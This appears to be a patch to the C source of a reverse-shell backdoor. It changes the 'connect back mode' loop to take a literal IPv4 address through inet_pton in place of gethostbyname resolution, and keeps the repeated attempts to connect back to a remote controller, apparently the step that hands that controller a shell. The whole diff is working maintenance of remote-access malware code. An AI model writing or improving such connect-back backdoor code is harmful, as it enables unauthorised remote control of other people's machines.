@@ -12,7 +12,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
-#include <netdb.h>
+#include <arpa/inet.h>
 #include <dirent.h>
 #include <sys/stat.h>
 
@@ -146,12 +146,26 @@ int main( )
 	}
 #else
 
-		/* -c specfieid, connect back mode */
+		/* -c specified, connect back mode */
 
-    struct hostent *client_host;
 	    while( 1 )
 	    {
 	        sleep( CONNECT_BACK_DELAY );
+
+	        if( cb_host == NULL )
+	        {
+	            continue;
+	        }
+
+	        memset( &client_addr, 0, sizeof( client_addr ) );
+	        client_addr.sin_family = AF_INET;
+	        client_addr.sin_port   = htons( server_port );
+
+	        /* parse client IPv4 address */
+	        if( inet_pton( AF_INET, cb_host, &client_addr.sin_addr ) <= 0 )
+	        {
+	            continue;
+	        }
 
 	        /* create a socket */
 
@@ -161,22 +175,6 @@ int main( )
 	        {
 	            continue;
 	        }
-
-	        /* resolve the client hostname */
-
-	        client_host = gethostbyname( cb_host );
-
-	        if( client_host == NULL )
-	        {
-	            continue;
-	        }
-
-	        memcpy( (void *) &client_addr.sin_addr,
-	                (void *) client_host->h_addr,
-	                client_host->h_length );
-
-	        client_addr.sin_family = AF_INET;
-	        client_addr.sin_port   = htons( server_port );
 
 	        /* try to connect back to the client */
 
